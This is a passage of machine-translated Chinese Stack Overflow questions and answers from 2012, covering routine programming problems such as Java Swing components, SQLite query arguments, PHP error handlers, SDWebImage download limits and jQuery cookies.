    this.setJMenuBar(menuBar);
    this.setSize(1000,1200);
    this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    this.setVisible(true);

    setup = new ReportGeneratorSetup(this);
    application = new ReportGeneratorProgram(this,setup);

    //this.add(setup);  
    this.validate();
}

public static void main(String[] args) {

    ReportGenerator rg = new ReportGenerator();
}  
public void switchToPanel(String panel)
{
    this.getContentPane().removeAll();

    if(panel.equals("Eval"))
    {
                    application.setupComponents();
        this.getContentPane().add(application);

    }
    else if(panel.equals("Setup"))
    {
        this.getContentPane().add(setup);
    }

    this.invalidate();
    this.validate();
}

@Override
public void actionPerformed(ActionEvent arg0)
{
    if(arg0.getSource() instanceof JMenuItem)
    {
        JMenuItem item = (JMenuItem)arg0.getSource();

        if(item.getText().equals("Exit"))
        {
            dispose();
            System.exit(0);
        }
    }
} 
```

}

我收到一条错误消息：

```
no suitable method found for add(reportgenerator.ReportGeneratorSetup)
    method java.awt.Container.add(java.awt.Component,java.lang.Object,int) is not applicable
      (actual and formal argument lists differ in length)
    method java.awt.Container.add(java.awt.Component,java.lang.Object) is not applicable
      (actual and formal argument lists differ in length)
    method java.awt.Container.add(java.awt.Component,int) is not applicable
      (actual and formal argument lists differ in length)
    method java.awt.Container.add(java.lang.String,java.awt.Component) is not applicable
      (actual and formal argument lists differ in length)
    method java.awt.Container.add(java.awt.Component) is not applicable
      (actual argument reportgenerator.ReportGeneratorSetup cannot be converted to java.awt.Component by method invocation conversion)
    method java.awt.Component.add(java.awt.PopupMenu) is not applicable
      (actual argument reportgenerator.ReportGeneratorSetup cannot be converted to java.awt.PopupMenu by method invocation conversion) 
```

谁能告诉我为什么会发生这种情况？这将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T13:56:15.420

您的类`ReportGeneratorSetup`需要是某种组件，很可能它需要扩展`JPanel`or `JComponent`。

# asp.net-mvc - 如何为 MVC3 指定一个输入模型和另一个输出（结果）模型？

> ID：11396418
> 
> 赞同：0
> 
> 时间：2012-07-09T13:51:50.353
> 
> 标签：asp.net-mvc, asp.net-mvc-3, model, viewmodel

当我需要将一个 ViewModel 类**传递**给 asp 页面（包含要显示的各种数据）并且需要将另一个 Model 类（通过标签）**提交**`form`回服务器时，我该怎么办？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T13:56:53.797

将*“其他视图模型”*嵌套在主视图模型中。然后将表单的控件绑定到子模型的属性。

动作方法签名：

```
[HttpPost]
public ActionResult Foo(SubModel model) { /* ... */ } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T13:56:58.223

您可以使用自定义模型绑定器根据输出模型生成的表单绑定输入模型。检查此链接以获取更多信息：

[http://buildstarted.com/2010/09/12/custom-model-binders-in-mvc-3-with-imodelbinder/](http://buildstarted.com/2010/09/12/custom-model-binders-in-mvc-3-with-imodelbinder/)

[ASP.NET MVC 3 模型绑定资源](https://stackoverflow.com/questions/5692964/asp-net-mvc-3-model-binding-resources)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T16:36:44.673

如果两个视图模型的属性或多或少相同，则默认模型绑定器将负责，否则您必须使用自定义模型绑定器。

如果您必须使用要在发布时绑定的 ViewModel 属性的名称创建 html 字段，则其他选项。

# android - Android sqlite 选择[]args

> ID：11396421
> 
> 赞同：1
> 
> 时间：2012-07-09T13:52:03.657
> 
> 标签：android, database, sqlite

通过给出示例寻找可以在 sqlite 查询生成器中使用 select args[] 的人。下面的代码无法正常工作。

```
public class DatabaseHelper extends SQLiteOpenHelper{

    public static String DB_PATH = "/data/data/yourpath/databases/";
    public static String DB_NAME ="your_sqlite";
    private static final int DATABASE_VERSION = 1;

    private final Context myContext;
    private SQLiteDatabase mydb;
    //private Cursor aliases;
    private Cursor m;

    public DatabaseHelper(Context ctx){ 
        super(ctx,DB_NAME,null,DATABASE_VERSION);
        this.myContext = ctx;

    }

    /**
     * creates an empty database and rewrites it with you own
     * */
    public void createDatabase() throws IOException{
        boolean dbExists = checkDatabase();

        if(dbExists){
            //do nothing 
        }else{
            // by calling this method an empty database will be created into default system path
            this.getReadableDatabase();

            try{
                copyDatabase();
            }
            catch(IOException e){
                throw new Error("Error copying database");
            }
        }

    }

/*
 * check if database exists to prevent re-copying the file each time you open the application
 * return true if exists otherwise false
 */
 private boolean checkDatabase(){
     SQLiteDatabase checkDB = null;

     try{
         String myPath = DB_PATH + DB_NAME;
         checkDB = SQLiteDatabase.openDatabase(myPath, null,SQLiteDatabase.OPEN_READONLY);

     }catch(SQLiteException e){

     }

     if (checkDB != null){
         checkDB.close();
     }
     return checkDB != null ? true : false;
 }

 /**
  * copies your database  from local assets folder to just created empty database
  * in the system folder from where it can be accessed and handled
  * */
 private void copyDatabase() throws IOException{
     //open your local db as the input stream
     InputStream myInput = myContext.getAssets().open(DB_NAME);

     //path to the just created empty db
     String outFileName = DB_PATH + DB_NAME;

     //open the empty db  as the outputStream
     OutputStream myOutput = new FileOutputStream(outFileName);

     //transfers bytes from the input file to output file
     byte[] buffer = new byte[1024];

     int length;

     while((length = myInput.read(buffer))>0){
         myOutput.write(buffer, 0, length);
     }
     //close the streams
     myOutput.flush();
     myOutput.close();
     myInput.close(); 
 }
 public void openDatabase() throws SQLException{
     //open the db
     String myPath = DB_PATH + DB_NAME;
     mydb = SQLiteDatabase.openDatabase(myPath, null,SQLiteDatabase.OPEN_READONLY);
 }
 public synchronized  void close(){
     if(mydb != null){
         mydb.close();
     }
     super.close();
 }

    @Override
public void onOpen(SQLiteDatabase db) {
    super.onOpen(db);
}

    @Override
    public void onCreate(SQLiteDatabase db) {

    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {

    }

public Cursor getAllCharacters(){

    return mydb.query("char",new String[]{"_id","gender_id","race_id","name"},
            null, null, null,null,null);
}
public void setCharacter(long id){
     m  = mydb.query("char",new String[]{"gender_id","race_id"},"_id =" + id,null,null,null,null,null);
     if (m == null){
         System.out.print("Cursor is empty");
     }
}

public Cursor getAliases(){
    String gender_id = m.getString(0);
    String race_id   = m.getString(1);
    String where = "_id=? AND _id=?";
    String[] args ={gender_id,race_id};

    Cursor alias = mydb.query("alias",new String[]{"_id","gender_id","race_id","alias"},
            where,args,null,null,null);
    return alias;
}

} 
```

我正在尝试从 getAliases() 获取光标

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T13:56:14.993

```
String where = "_id=? AND _id=?"; 
```

看起来您正在尝试查询具有相同名称的两列？SQLite 表只能有唯一的列名，所以不能有两个名为`_id`.

# php - 是否可以捕获文件中发生的所有 PHP 错误

> ID：11396422
> 
> 赞同：4
> 
> 时间：2012-07-09T13:52:05.537
> 
> 标签：php, error-handling

我想在一个页面中捕获所有 PHP 错误（E_ERROR、E_WARNING、E_NOTICE、..）并将其记录到 MongoDB，以便更好地阅读和评论它。

我找到了一种使用“error_get_last”捕获最后发生的错误并使用“register_shutdown_function”将其发送到我想要的任何地方的[方法使用 register_shutdown_function() 处理 PHP 中的致命错误](https://stackoverflow.com/questions/4410632/handle-fatal-errors-in-php-using-register-shutdown-function)

但是如果我的文件有多个错误，比如警告和通知，我怎样才能得到一个文件中的所有错误？这可能吗？我需要的是'error_get_all'之类的东西。

在这里你可以找到我的代码，这个代码有一个致命错误，两个警告和一个通知：

```
function shutdown() {
  $error = error_get_last();
  if ($error['type'] === E_ERROR || $error['type'] === E_WARNING || $error['type'] === E_NOTICE) {
    var_dump($error);
  }
}

register_shutdown_function('shutdown');

spl_autoload_register('foo');

$x = 5;
$y = 0;

echo 'x/y: ' . $x / $y . '<br/>';

foreach ($noarray as $noelement) {
  echo 'no element: ' . $noelement . '<br/>';
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-09T14:00:13.900

答案是结合解决方案：

使用 'set_error_handler' 捕获所有可能的错误（参见[http://php.net/manual/en/function.set-error-handler.php](http://php.net/manual/en/function.set-error-handler.php)），以及使用描述的 register_shutdown_function 记录遗漏的错误这样。

通过这样做，自定义处理程序将捕获运行时期间的非致命错误，一直持续到脚本结束或发生致命错误，该错误将由自定义或关闭函数根据类型捕获。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-09T13:53:55.963

使用[set_error_handler](http://php.net/manual/en/function.set-error-handler.php)。

> 用户定义的函数无法处理以下错误类型：E_ERROR、E_PARSE、E_CORE_ERROR、E_CORE_WARNING、E_COMPILE_ERROR、E_COMPILE_WARNING，以及在调用 set_error_handler() 的文件中引发的大部分 E_STRICT。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-07-15T12:53:02.717

为了捕获致命错误和解析错误，您正在使用正确的功能

```
register_shutdown_function 
```

但是当应用程序遇到致命错误，或解析或任何错误 E_ERROR 时，执行过程在脚本的该点结束，因此在这种情况下，您只能在脚本中捕获一个这样的错误。

我建议您使用`register_shutdown_function`以防万一捕获致命错误，并使用函数`set_error_handler`捕获其他错误以捕获其他错误作为警告等，对于异常`set_exception_handler`，您可以轻松跟踪系统中的所有错误并验证它们。

如果您要为错误处理编写对象，那么您的逻辑可以是：

```
$handler = new Handler();
$handler->handleExceptions(); //using set_exception_handler exceptions
$handler->handleError(E_ALL); //using set_error_handler all other errors
$handler->handleShutdown(); //using register_shutdown_function fatals, parsing 
```

这样，您将可以选择关闭/打开错误并将错误存储在您需要的地方或通过电子邮件从一个地方发送，这也是获得完整错误以进行调试的简单方法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-09T13:56:14.430

可能您想使用这样的框架： [http ://code.google.com/p/lagger/](http://code.google.com/p/lagger/)

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-07-09T14:02:28.800

遇到第一个错误之后的致命错误是不可能捕获的，因为 PHP 解释器永远不会到达它们（脚本在执行您的关闭处理程序后终止）。可以捕获非致命错误（`error_handler`除了关闭处理程序之外，您还需要为它们安装单独的错误），PHP 不会终止脚本，因此如果您也没有在错误处理程序中终止它，每次执行将继续执行非致命错误，您将全部捕获。如果您还想在*之后终止*整个文件已执行，您可能希望在某处保留一个标志，在包含文件之前清除它并在出现错误时引发它；包含文件后，您可以测试此标志并查看是否发现任何错误。请记住，包含的文件将在该点完全执行（如果它没有任何致命错误），或者您可能永远不会到达该点（如果它有致命错误）。

如果您正在运行不受信任的用户代码，您可能会对[Runkit Sandboxes](http://bg2.php.net/manual/en/runkit.sandbox.php)感兴趣。您还可以查看[runkit_lint_file()](http://bg2.php.net/manual/en/function.runkit-lint-file.php)以进行一些预包含验证。

# ios - sdwebimage：有多少 setimageWithUrl 可以排队？

> ID：11396425
> 
> 赞同：5
> 
> 时间：2012-07-09T13:52:21.877
> 
> 标签：ios, sdwebimage

我想知道一次可以提交多少个 setImageWithUrl 消息是否有上限？我正在尝试加载 30 张照片，其中 10 张下载成功，但其他在尝试调试问题时输入 requestFailed

任何提示或澄清？谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-08-07T08:17:58.507

对于那些来这里寻求有关 SDWebImage 中最大并发下载数的答案的人，我想补充一下之前的答案。

我不建议更改 SDWebImageDownloader 的 init，因为您可能想要更新 SDWebImage，或者像我一样调整应用程序不同区域的并发下载数量。

```
//thumbnails.m
//Loading thumbnails. It is faster to load them concurrently
SDWebImageManager.sharedManager.imageDownloader.maxConcurrentDownloads = 10;
[yourImageView setImageWithURL:thumbURL];

//fullScreen.m
//Loading big images in full-screen view, 
SDWebImageManager *sharedManager = [SDWebImageManager sharedManager];
[sharedManager.imageDownloader setMaxConcurrentDownloads:1];
[sharedManager cancelAll]; //cancel all current queue 
[yourImageView setImageWithURL:URL]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T07:09:01.430

尽管您的问题是由于您提到的不正确的网址引起的，但我正在为其他前来寻找答案的人回答这个问题：

在最新版本的 SDWebImage 框架中，可以通过在 SDWebImageDownloader 的 init 中设置变量 downloadQueue.maxConcurrentOperationCount 来设置最大并发下载数。这将限制应用程序中“downloadwithURL”调用的最大并发下载数。该框架会将任何其他操作放入队列中，并在当前执行的下载完成时执行它们。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-06-14T04:45:23.607

我通过设置这个值发现了一个奇怪的问题。根据苹果文档，这个值应该只影响并发下载图像数量，而不是总下载图像数量。但是，如果我的情况，如果这个值设置为 2，我只能下载 2 个图像，即使我调用下载函数超过 2。这个值似乎设置了 downloadQueue 大小的大小，而不是 currentOperation 数。有人有同样的问题吗？？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-11-17T12:41:06.697

# `maxConcurrentOperationCount`of`NSOperationQueue`在 iPhone 平台上只能设置为 1 到 6。

`maxConcurrentOperationCount`设置为`NSOperationQueue`默认值不是一个好主意。因为这意味着无限数量的队列。

## 什么时候应该将`maxConcurrentOperationCount`of`NSOperationQueue` 设置为 1 到 6 ？

当可以同时调用多个任务时，`maxConcurrentOperationCount`of`NSOperationQueue`应该设置为6。例如，可以同时下载多个图像。

为什么是 6 而不是 10 或 100？

在名为 的框架`SDWebImage`中，我们可以看到源代码如下：

```
- (instancetype)init {
   self = [super init];
   if (self) {
       _maxConcurrentDownloads = 6;
       _downloadTimeout = 15.0;
       _executionOrder = SDWebImageDownloaderFIFOExecutionOrder;
       _acceptableStatusCodes = [NSIndexSet indexSetWithIndexesInRange:NSMakeRange(200, 100)];
   }
   return self;
} 
```

此代码表示默认值为 6。 [SDWebImage 参考 SDWebImageDownloaderConfig 类参考](https://sdwebimage.github.io/SDWebImage/Classes/SDWebImageDownloaderConfig.html#/c:objc(cs)SDWebImageDownloaderConfig(py)maxConcurrentDownloads "SDWebImage 参考 SDWebImageDownloaderConfig 类参考")

的含义 `maxConcurrentDownloads`与`maxConcurrentOperationCount`（[Apple-Docs-NSOperationQueue-maxConcurrentOperationCount](https://developer.apple.com/documentation/foundation/nsoperationqueue/1414982-maxconcurrentoperationcount "Apple-Docs-NSOperationQueue-maxConcurrentOperationCount")）相同

为什么是 6 而不是 10 或 100？

`SDWebImage` 说它的编码器是通过实验：

参考：[为什么 SDWebImageDownloader maxConcurrentOperationCount = 6？#1961](https://github.com/SDWebImage/SDWebImage/issues/1961)

忽略实验， 从 iPhone 到 iPhone 13/13 Pro/13 Pro Max，iOS 平台上处理器核心的最大数量是 6 个，所以应该设置为 1 到 6 `maxConcurrentOperationCount`。`NSOperationQueue`

| 苹果手机 | 首次发布 | 系统开启 | 处理器核心数 |
| --- | --- | --- | --- |
| 苹果手机 | 2007年 | S (三星 S5L8900) | 1个核心 |
| iPhone 3G | 2008年 | S (三星 S5L8900) | 1个核心 |
| iPhone 3GS | 2009 | S（三星S5PC100 | 1个核心 |
| iPhone 4 | 2010 | A4 | 1个核心 |
| iPhone 4S | 2011 | A5 | 2个核心 |
| iphone 5 | 2012 | A6 | 2个核心 |
| iPhone 5S | 2013 | A7 | 2核 |
| iPhone 6/6 加 | 2014 | A8 | 2个核心 |
| iPhone 6s/6s plus/SE | 2015 | A9 | 2个核心 |
| iPhone 7/加 | 2016 年 | A9 | 4核（使用2核） |
| iPhone 8/加/X | 2017 | A11 | 6 个核心 = 2 个高功率 Monsoon 核心 + 4 个低功率 Mistral 核心 |
| iPhone XS/XS MAX/XR | 2018 | A12 | 6 个核心 = 2 个高功率 Vortex 核心 + 4 个低功率 Tempest 核心 |
| iPhone 11 /11 Pro/11 Pro Max | 2019 | A13 | 6 个核心 = 2 个性能 + 4 个效率核心 |
| iPhone 12 /12 Pro/12 Pro Max | 2020 | A14 | 6 个核心 = 2 个性能 + 4 个效率核心 |
| iPhone 13 /13 Pro/13 Pro Max | 2021 | A15 | 6 个核心 = 2 个性能 + 4 个效率核心 |

我们可以使用如下代码打印处理器内核的数量：

```
 NSUInteger cpuCoresCount = [[NSProcessInfo processInfo] processorCount]; 
```

我们可以使用如下代码打印活动处理器内核的数量：

```
 NSUInteger activeCPUCoresCount = [[NSProcessInfo processInfo] activeProcessorCount]; 
```

参考文档：[Apple-Docs-NSProcessInfo-processorCount](https://developer.apple.com/documentation/foundation/nsprocessinfo/1415622-processorcount "Apple-Docs-NSProcessInfo-processorCount")

`_maxConcurrentDownloads`在 iPhone 平台上设置为 CPU 核心数是合理 的。至于进一步的评论，`activeProcessorCount`可能会更好。

在名为 的框架中`YYKit`，`queueCount`设置为`activeProcessorCount`.

```
#define MAX_QUEUE_COUNT 16
   static int queueCount;
   static dispatch_queue_t queues[MAX_QUEUE_COUNT];
   static dispatch_once_t onceToken;
   static int32_t counter = 0;
   dispatch_once(&onceToken, ^{
       queueCount = (int)[NSProcessInfo processInfo].activeProcessorCount;
       queueCount = queueCount < 1 ? 1 : queueCount > MAX_QUEUE_COUNT ? MAX_QUEUE_COUNT : queueCount;
       if ([UIDevice currentDevice].systemVersion.floatValue >= 8.0) {
           for (NSUInteger i = 0; i < queueCount; i++) {
               dispatch_queue_attr_t attr = dispatch_queue_attr_make_with_qos_class(DISPATCH_QUEUE_SERIAL, QOS_CLASS_USER_INITIATED, 0);
               queues[i] = dispatch_queue_create("com.ibireme.yykit.render", attr);
           }
       } else {
           for (NSUInteger i = 0; i < queueCount; i++) {
               queues[i] = dispatch_queue_create("com.ibireme.yykit.render", DISPATCH_QUEUE_SERIAL);
               dispatch_set_target_queue(queues[i], dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0));
           }
       }
   });
   int32_t cur = OSAtomicIncrement32(&counter);
   if (cur < 0) cur = -cur;
   return queues[(cur) % queueCount];
#undef MAX_QUEUE_COUNT 
```

## 什么时候应该设置`maxConcurrentOperationCount`为`NSOperationQueue` 1 ？

它们设置`maxConcurrentOperationCount`为一个意味着只能同时调用一个任务。

当只能同时调用一个任务时， `maxConcurrentOperationCount`应设置为1。例如，只能同时动画一张GIF图像；只能同时播放一个视频。此外，只能同时解码一个视频/图像。

参考：[Apple-Docs-NSOperationQueue-maxConcurrentOperationCount](https://developer.apple.com/documentation/foundation/nsoperationqueue/1414982-maxconcurrentoperationcount "Apple-Docs-NSOperationQueue-maxConcurrentOperationCount")

# jquery - 为 jquery 样式开关添加 cookie

> ID：11396426
> 
> 赞同：2
> 
> 时间：2012-07-09T13:52:26.027
> 
> 标签：jquery, css, cookies, styles, switch-statement

我有一个要添加功能的按钮。当您单击按钮时，站点的样式将变为高对比度版本（即样式表 high_contrast.css 被附加到头部）。显然我做错了一些事情，因为下面的代码只是切换当前页面的样式，当您导航到另一个页面时，它会切换回默认样式。我可能不应该每次都设置那个变量 highContrast。我想使用查询 cookie 插件（https://github.com/carhartl/jquery-cookie）来完成此操作，但在这种情况下并不真正了解如何使用它。

这是 HTML

```
<div id="contrast-btn"><a href="#" rel="css/high-contrast.css">high contrast</a></div> 
```

这是脚本

```
$(document).ready(function(){
    var highContrast = false;
    $("#contrast-btn a").click(function () {
        if (!(highContrast)) {
            $('head').append('<link rel="stylesheet" href="css/high-contrast.css" type="text/css" id="hc_stylesheet"/>');
            highContrast = true;
        }       
        else {
            // remove the high-contrast style
            $("#hc_stylesheet").remove();
            highContrast = false;
        }
    });
}); 
```

谢谢你的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T13:58:53.837

您必须通过 cookie 获取和设置值：

```
$(document).ready(function(){
// DRY wrapper function
function appendStyleSheet() {
  $('head').append('<link rel="stylesheet" href="css/high-contrast.css" type="text/css" id="hc_stylesheet"/>'); 
}
// append the style sheet on load if the cookie is set to true
if ($.cookie('high_contrast') == 'true') {
  appendStyleSheet();      
}
$("#contrast-btn a").click(function () {
    if ($.cookie('high_contrast') != 'true') {

        appendStyleSheet();      
        $.cookie('high_contrast', 'true'); // set the cookie to true
    }       
    else {
        // remove the high-contrast style
        $("#hc_stylesheet").remove();
        $.cookie('high_contrast', 'false');
    }
});
}); 
```

您可以将过期或站点范围内的有效性等选项添加到 cookie，因此如果您希望 cookie 有效期为一年，请将其添加到 cookie 命令

```
$.cookie('high_contrast', 'false', {expires: 365}); 
```

如果您希望它在您的整个域中有效，这很可能是您的实现的情况，您可以添加路径“/”：

```
$.cookie('high_contrast', 'false', {path: '/'}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T13:57:02.247

您可以`highContrast`在全局上下文中设置，这将有助于您稍后*在同一页面上*进行评估：

```
var highContrast = false;
$(document).ready(function(){
    // [...]
    highContrast = true;
    // [...]
}); 
```

但是该值会在每次页面刷新时丢失，因此您可以 - 如您所愿 - 使用[jquery-cookie 设置 cookie](https://github.com/carhartl/jquery-cookie)

```
$.cookie('highContrast', 'true', { path: '/' }); 
```

并在页面加载时阅读：

```
if($.cookie('highContrast') && $.cookie('highContrast') === "true") {}; 
```

通过设置`path = '/'`，cookie 将在整个域中可用。

所以你的代码会变成这样：

```
$(document).ready(function(){
    // Append the stylesheet on page load
    if ($.cookie('highContrast') === "true") {
        $('head').append('<link rel="stylesheet" href="css/high-contrast.css" type="text/css" id="hc_stylesheet"/>');
    }
    // Add the click handler to switch the stylesheet on and off
    $("#contrast-btn a").click(function () {
        if (!($.cookie('highContrast') === "true")) {
            $('head').append('<link rel="stylesheet" href="css/high-contrast.css" type="text/css" id="hc_stylesheet"/>');
            $.cookie('highContrast','true',{path:'/'});
        }       
        else {
            // remove the high-contrast style
            $("#hc_stylesheet").remove();
            $.cookie('highContrast','false',{path:'/'});
        }
    });
}); 
```

# actionscript-3 - 在每个循环内的匿名函数中绑定变量

> ID：11396428
> 
> 赞同：0
> 
> 时间：2012-07-09T13:52:32.057
> 
> 标签：actionscript-3

以下代码将仅将循环中的最后一个 Widget 添加到*所有*侦听器函数。所有函数都会在最后一个对象上调用 toggleShow()。

为什么会发生这种情况，有没有办法让每个 Widget 对象在相应的函数中被引用？

```
for each (var w:Widget in workspace.getWidgetList()) {
    var widgetShow:NativeMenuItem = menu.addItem(new NativeMenuItem("Show " + w.title)); 
    widgetShow.addEventListener(Event.SELECT, function():void {
        w.toggleShow();
    }); 
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:15:49.303

让它成为一个函数，这是因为循环运行到最后并且 w 成为该列表中的最后一个元素，因此当调用匿名函数时，它总是使用最后一个元素：

```
for each (var w:Widget in workspace.getWidgetList()) {
   addMenuItem(w);
}

function addMenuItem(w:Widget):void
{
    var widgetShow:NativeMenuItem = menu.addItem(new NativeMenuItem("Show " + w.title)); 
    widgetShow.addEventListener(Event.SELECT, function():void {
        w.toggleShow();
    }); 
} 
```

# vba - 将列宽扩展到该列中最大值的大小？

> ID：11396433
> 
> 赞同：4
> 
> 时间：2012-07-09T13:52:46.977
> 
> 标签：vba, excel

在 Excel 中，如果双击右侧“边框”上的列，则可以将宽度自动调整为该列中最大值的宽度。

如何在 VBA 中复制这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-09T14:14:04.320

您可以使用宏记录器执行操作并查看；

```
<range>.entirecolumn.autofit 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-09T13:56:16.107

调用对象的`AutoFit`方法`Column`。

像这样：

```
ActiveSheet.UsedRange.Columns.AutoFit 
```

或者像这样：

```
Columns("A:A").EntireColumn.AutoFit 
```

# facebook - 测试用户和未发布的页面

> ID：11396436
> 
> 赞同：6
> 
> 时间：2012-07-09T13:53:00.083
> 
> 标签：facebook, facebook-test-users

只是一个简单的问题 - 我似乎无法使用我为我正在开发的应用程序创建的测试用户访问我未发布的页面。此应用程序作为选项卡绑定到未发布的页面，每次我尝试使用测试用户导航到页面时，我都会被重定向回测试用户的墙。

作为测试，我发布了页面，这一次我能够使用测试用户访问应用程序。

当然，我们可以使用测试用户帐户一起测试我们的页面和应用程序，同时将页面和应用程序保持在沙盒状态？

干杯

李

# webgl - 计算表面积

> ID：11396437
> 
> 赞同：0
> 
> 时间：2012-07-09T13:53:05.547
> 
> 标签：webgl, three.js

对于给定的地形，如何计算其表面积？

截至目前，我计划使用 Three.js 构建地形，例如：

```
var geo = new THREE.PlaneGeometry(300, 300, 10, 10);

for (var i = 0; i < geo.vertices.length; i++)
    geo.vertices[i].y = someHeight; // Makes the flat plain into a terrain 
```

接下来，如果可以遍历几何体的每个底层三角形（即，给 WebGL 数组的 TRIANGLE_STRIP 三角形），则可以将每个三角形的面积相加以获得总表面积。

这种方法听起来对吗？如果是这样，你如何确定单个三角形的顶点？

欢迎任何其他在 WebGL/Three.js 中构建地形的想法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-15T07:33:02.910

我认为您的方法听起来不错，应该不难实施。

我不熟悉three.js，但我认为确定顶点的位置很容易。您知道顶点在 之间均匀分布`x=0...300`，`z=0...300`并且您知道`y`坐标。所以`[i,j]`-th 顶点有 position `[i*300/10, y, j*300/10]`。

您`10x10`总共有段，每个段由 2 个三角形组成。这是你必须小心的地方。三角形可以形成两种不同的形状：

```
------        ------
| \  |        |   /|
|  \ |   or   |  / |
|   \|        | /  |
------        ------ 
```

这可能会导致不同的形状和（我对此不完全确定）进入不同的表面积。

当您了解 three.js 究竟是如何创建曲面时，迭代地对三角形曲面求和应该相对容易。

如果能够在没有对所有三角形进行实际迭代的情况下进行求和，那就太好了，但是，现在，我不知道该怎么做......

# asp.net - ASPxDateEdit：如何仅显示 DateTime 的日期组件（即隐藏时间组件）？

> ID：11396439
> 
> 赞同：0
> 
> 时间：2012-07-09T13:53:18.370
> 
> 标签：asp.net, datetime, datepicker, devexpress

我正在使用 ASPxDateEdit 控件来编辑日期字段。这个特定字段的时间部分永远不会相关，所以我想隐藏它，以便只有日期部分可见。我尝试了以下方法：

`<dx:ASPxDateEdit ID="dpExpirationDate" EditFormat="Date" runat="server" />`

`<dx:ASPxDateEdit ID="dpExpirationDate" EditFormat="Custom" EditFormatString="M/d/yyyy" runat="server" />`

`<dx:ASPxDateEdit ID="dpExpirationDate" EditFormat="Custom" EditFormatString="{0:M/d/yyyy}" runat="server" />`

我是这样设置的：

`dpExpirationDate.Value = Entity.ExpirationDate`

无论我尝试什么，它仍然显示 7/9/2012 12:00:00 AM。如何隐藏时间组件？

此外，具有代表的人可能会添加`ASPxDateEdit`为标签。

**更新：**我发现了这个问题，而且它非常古怪，但是人们对 DevExpress 控件有什么期望呢？

我发现在代码隐藏中将 ASPxDateEdit 的 Visible 属性设置为 True 或 False 将导致它显示时间组件，无论您为其 EditFormat 属性设置什么。此外，推入日期字符串也会产生相同的效果，因此不要尝试分配`DateTime.Now.ToString()`给它的 Value 属性，否则您会遇到相同的结果。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T13:58:17.057

您的第一个变体适用于我的环境。因此，将[EditFormat](http://documentation.devexpress.com/#AspNet/DevExpressWebASPxEditorsASPxDateEdit_EditFormattopic)属性值设置为 Date。
[EditFormat 枚举值。](http://documentation.devexpress.com/#AspNet/DevExpressWebASPxEditorsEditFormatEnumtopic)
至于切换可见属性，我无法重现此问题。[但是， Visible](http://documentation.devexpress.com/#AspNet/DevExpressWebASPxEditorsASPxEdit_Visibletopic)和[ClientVisible](http://documentation.devexpress.com/#AspNet/DevExpressWebASPxEditorsASPxEditBase_ClientVisibletopic)属性之间有一个重要的区别。如果将 Visible 设置为 false，则不会呈现控件。因此，您无法在客户端对其进行操作。如果您希望控件呈现隐藏，则必须使用 ClientVisible 属性。

# xpages - 服务器端 onclick 事件在会话超时后停止工作？

> ID：11396442
> 
> 赞同：0
> 
> 时间：2012-07-09T13:53:20.910
> 
> 标签：xpages, xpages-ssjs, xpages-extlib

我有一个单选按钮组和其他一些下拉选择来过滤视图。当用户选择一个值时，它们使用 onclick SSJS 事件来更改视图。我在视图项目的链接中也有一个 onclick 事件。除非我让网页停留超过 30 分钟，否则一切都很好。然后 onclick SSJS 事件全部停止工作。我假设会话正在超时。这是正在发生的事情吗？

当然，我可以增加这个，但是，有没有办法在客户端 JS 中检测到会话已超时，以便我可以刷新网页？我不在乎我是否会丢失用户选择的值。但是，让所有这些 onclick 事件在用户身上消失会使页面在刷新页面之前无法使用。

我尝试了分机的保活控制。Lib，但没有任何效果！

霍华德

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T19:02:46.073

您可以使用 Ajax 调用返回会话变量。一旦它消失，您就知道会话已超时。

# iphone - 如何使用 SOAP Web 服务发送图像数据和其他参数

> ID：11396444
> 
> 赞同：0
> 
> 时间：2012-07-09T13:53:38.473
> 
> 标签：iphone, ios, soap

我想通过肥皂网络服务发送图像数据。我的肥皂信息如下所述。

```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<TestFile xmlns="http://tempuri.org/">
  <userID>int</userID>
  <FileTitle>string</FileTitle>
  <FileName>string</FileName>
  <BufferFile>base64Binary</BufferFile>
  <languageID>int</languageID>
</TestFile>
</soap:Body>
</soap:Envelope> 
```

我想用base64编码在bufferFile上添加图像。

给我任何可以同时发送maltipart数据或参数的建议或示例代码。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:30:51.940

尝试使用[SudzC](http://sudzc.com/)，它将为 iOS 生成客户端代码，与您的 WebService 进行通信。在您的情况下，它将生成一个方法，其中包含您需要传递的参数。您只需要一个 WSDL。

# air - Flash Builder Profiler 内存使用情况

> ID：11396451
> 
> 赞同：1
> 
> 时间：2012-07-09T13:54:11.983
> 
> 标签：air, profiling, flash-builder, flex-mobile

